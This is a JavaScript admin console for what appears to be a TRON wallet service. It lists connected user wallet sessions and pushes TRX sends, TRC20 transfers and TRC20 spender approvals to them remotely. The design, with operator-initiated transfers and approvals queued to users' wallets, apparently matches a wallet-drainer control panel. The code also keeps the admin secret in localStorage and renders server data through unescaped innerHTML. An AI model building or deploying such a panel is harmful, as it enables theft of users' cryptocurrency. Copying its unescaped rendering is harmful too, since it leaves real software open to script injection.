const STORAGE_API = "tw_tron_admin_api";
const STORAGE_SECRET = "tw_tron_admin_secret";

const el = {
  mobileBlock: document.getElementById("mobileBlock"),
  apiBase: document.getElementById("apiBase"),
  adminSecret: document.getElementById("adminSecret"),
  connectBtn: document.getElementById("connectBtn"),
  refreshBtn: document.getElementById("refreshBtn"),
  status: document.getElementById("status"),
  walletRows: document.getElementById("walletRows"),
  requestRows: document.getElementById("requestRows"),
  walletSelect: document.getElementById("walletSelect"),
  requestForm: document.getElementById("requestForm"),
  requestType: document.getElementById("requestType"),
  toAddress: document.getElementById("toAddress"),
  tokenAddress: document.getElementById("tokenAddress"),
  spenderAddress: document.getElementById("spenderAddress"),
  amountValue: document.getElementById("amountValue"),
  decimalsValue: document.getElementById("decimalsValue"),
  requestNote: document.getElementById("requestNote"),
  eventsBox: document.getElementById("eventsBox"),
};

const state = {
  apiBase: "",
  adminSecret: "",
  wallets: [],
  requests: [],
  events: [],
  ws: null,
  connected: false,
};

function isMobileDevice() {
  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || "");
}

function setStatus(text) {
  el.status.textContent = text;
}

function trimSlash(value) {
  return value.replace(/\/+$/, "");
}

function normalizeApiBase(rawValue) {
  let value = trimSlash(String(rawValue || "").trim());
  if (!value) return "";

  if (!/^https?:\/\//i.test(value)) {
    value = `${window.location.protocol === "https:" ? "https" : "http"}://${value}`;
  }

  if (window.location.protocol === "https:" && value.startsWith("http://")) {
    const withoutScheme = value.slice("http://".length).replace(/:8787(?=\/|$)/, "");
    value = `https://${withoutScheme}`;
  }

  return trimSlash(value);
}

function formatDate(iso) {
  if (!iso) return "-";
  const date = new Date(iso);
  return Number.isNaN(date.getTime()) ? iso : date.toLocaleString();
}

function shortText(text, max = 22) {
  if (!text) return "-";
  if (text.length <= max) return text;
  return `${text.slice(0, max - 3)}...`;
}

async function adminFetch(path, options = {}) {
  if (!state.apiBase || !state.adminSecret) {
    throw new Error("Set API base and admin secret first");
  }

  const response = await fetch(`${state.apiBase}${path}`, {
    ...options,
    headers: {
      "Content-Type": "application/json",
      "x-admin-secret": state.adminSecret,
      ...(options.headers || {}),
    },
  });

  if (!response.ok) {
    const text = await response.text();
    throw new Error(text || `Request failed with status ${response.status}`);
  }

  return response.json();
}

function renderWallets() {
  if (state.wallets.length === 0) {
    el.walletRows.innerHTML = `<tr><td colspan="4">No wallets registered yet.</td></tr>`;
    el.walletSelect.innerHTML = `<option value="">No wallet</option>`;
    return;
  }

  el.walletRows.innerHTML = state.wallets
    .map(
      (wallet) => `
      <tr>
        <td>${wallet.clientId}</td>
        <td>${wallet.address}</td>
        <td>${wallet.connected ? "connected" : "offline"}</td>
        <td>${formatDate(wallet.lastSeen)}</td>
      </tr>
    `,
    )
    .join("");

  el.walletSelect.innerHTML = state.wallets
    .map(
      (wallet) =>
        `<option value="${wallet.clientId}">${wallet.address} (${wallet.connected ? "online" : "offline"})</option>`,
    )
    .join("");
}

function renderRequests() {
  if (state.requests.length === 0) {
    el.requestRows.innerHTML = `<tr><td colspan="7">No requests yet.</td></tr>`;
    return;
  }

  el.requestRows.innerHTML = state.requests
    .map(
      (request) => `
      <tr>
        <td>${formatDate(request.createdAt)}</td>
        <td>${request.type}</td>
        <td>${request.address}</td>
        <td class="status-${request.status}">${request.status}</td>
        <td>${request.txid || "-"}</td>
        <td>${shortText(request.error, 80)}</td>
        <td>${request.note || "-"}</td>
      </tr>
    `,
    )
    .join("");
}

function renderEvents() {
  if (state.events.length === 0) {
    el.eventsBox.textContent = "No events yet.";
    return;
  }

  const lines = state.events
    .slice(0, 30)
    .map((event) => `[${formatDate(event.timestamp)}] ${event.type} ${JSON.stringify(event.payload)}`);
  el.eventsBox.textContent = lines.join("\n");
}

function renderAll() {
  renderWallets();
  renderRequests();
  renderEvents();
}

function applySnapshot(snapshot) {
  state.wallets = snapshot.wallets || [];
  state.requests = snapshot.requests || [];
  state.events = snapshot.events || [];
  renderAll();
}

function wsUrlFromApiBase(apiBase) {
  if (apiBase.startsWith("https://")) {
    return `wss://${apiBase.slice("https://".length)}/ws`;
  }
  if (apiBase.startsWith("http://")) {
    return `ws://${apiBase.slice("http://".length)}/ws`;
  }
  return `ws://${apiBase}/ws`;
}

function connectSocket() {
  if (state.ws && (state.ws.readyState === WebSocket.OPEN || state.ws.readyState === WebSocket.CONNECTING)) {
    return;
  }

  const wsUrl = wsUrlFromApiBase(state.apiBase);
  state.ws = new WebSocket(wsUrl);

  state.ws.onopen = () => {
    setStatus("Admin connected");
    state.ws.send(
      JSON.stringify({
        type: "identify",
        role: "admin",
        secret: state.adminSecret,
      }),
    );
  };

  state.ws.onmessage = (event) => {
    let payload;
    try {
      payload = JSON.parse(event.data);
    } catch {
      return;
    }

    if (payload.type === "admin_snapshot" && payload.data) {
      applySnapshot(payload.data);
      return;
    }

    if (payload.type === "error") {
      setStatus(`WebSocket error: ${payload.message}`);
    }
  };

  state.ws.onclose = () => {
    setStatus("WebSocket disconnected");
  };
}

async function loadSnapshot() {
  const snapshot = await adminFetch("/api/admin/snapshot");
  applySnapshot(snapshot);
}

async function connectAdmin() {
  state.apiBase = normalizeApiBase(el.apiBase.value);
  state.adminSecret = el.adminSecret.value.trim();

  if (!state.apiBase || !state.adminSecret) {
    setStatus("API base and admin secret are required");
    return;
  }

  localStorage.setItem(STORAGE_API, state.apiBase);
  localStorage.setItem(STORAGE_SECRET, state.adminSecret);

  setStatus("Connecting...");
  try {
    await loadSnapshot();
    connectSocket();
    state.connected = true;
    setStatus("Admin connected");
  } catch (error) {
    state.connected = false;
    setStatus(`Connect failed: ${String(error)}`);
  }
}

function buildRequestPayload() {
  const clientId = el.walletSelect.value.trim();
  const type = el.requestType.value;
  const note = el.requestNote.value.trim();
  const amount = el.amountValue.value.trim();
  const decimalsRaw = el.decimalsValue.value.trim();
  const decimals = decimalsRaw ? Number(decimalsRaw) : 6;

  if (!clientId) {
    throw new Error("Select wallet session");
  }

  if (!amount) {
    throw new Error("Amount is required");
  }

  if (!Number.isInteger(decimals) || decimals < 0 || decimals > 30) {
    throw new Error("Decimals must be integer between 0 and 30");
  }

  if (type === "send_trx") {
    const to = el.toAddress.value.trim();
    if (!to) {
      throw new Error("To address is required for TRX send");
    }
    return {
      clientId,
      type,
      note,
      params: {
        to,
        amount,
      },
    };
  }

  if (type === "trc20_transfer") {
    const token = el.tokenAddress.value.trim();
    const to = el.toAddress.value.trim();
    if (!token || !to) {
      throw new Error("Token and To address are required for TRC20 transfer");
    }
    return {
      clientId,
      type,
      note,
      params: {
        token,
        to,
        amount,
        decimals,
      },
    };
  }

  if (type === "trc20_approve") {
    const token = el.tokenAddress.value.trim();
    const spender = el.spenderAddress.value.trim();
    if (!token || !spender) {
      throw new Error("Token and Spender address are required for TRC20 approve");
    }
    return {
      clientId,
      type,
      note,
      params: {
        token,
        spender,
        amount,
        decimals,
      },
    };
  }

  throw new Error("Unsupported request type");
}

async function submitRequest(event) {
  event.preventDefault();

  if (!state.connected) {
    setStatus("Connect admin first");
    return;
  }

  try {
    const payload = buildRequestPayload();
    const result = await adminFetch("/api/admin/requests", {
      method: "POST",
      body: JSON.stringify(payload),
    });
    setStatus(
      result.delivered
        ? "Request sent to user wallet session"
        : "Request saved, wallet is currently offline",
    );
    await loadSnapshot();
  } catch (error) {
    setStatus(`Request failed: ${String(error)}`);
  }
}

function initDesktopGuard() {
  if (isMobileDevice()) {
    el.mobileBlock.hidden = false;
    el.connectBtn.disabled = true;
    el.refreshBtn.disabled = true;
    setStatus("Blocked on mobile");
  }
}

function hydrateSavedValues() {
  const isLocal =
    window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
  const defaultBase = isLocal
    ? `${window.location.protocol}//${window.location.hostname || "localhost"}:8787`
    : window.location.origin;

  const savedBase = localStorage.getItem(STORAGE_API);
  el.apiBase.value = normalizeApiBase(savedBase || defaultBase);
  el.adminSecret.value = localStorage.getItem(STORAGE_SECRET) || "";
}

el.connectBtn.addEventListener("click", connectAdmin);
el.refreshBtn.addEventListener("click", async () => {
  if (!state.connected) {
    setStatus("Connect admin first");
    return;
  }
  try {
    await loadSnapshot();
    setStatus("Refreshed");
  } catch (error) {
    setStatus(`Refresh failed: ${String(error)}`);
  }
});
el.requestForm.addEventListener("submit", submitRequest);

hydrateSavedValues();
initDesktopGuard();
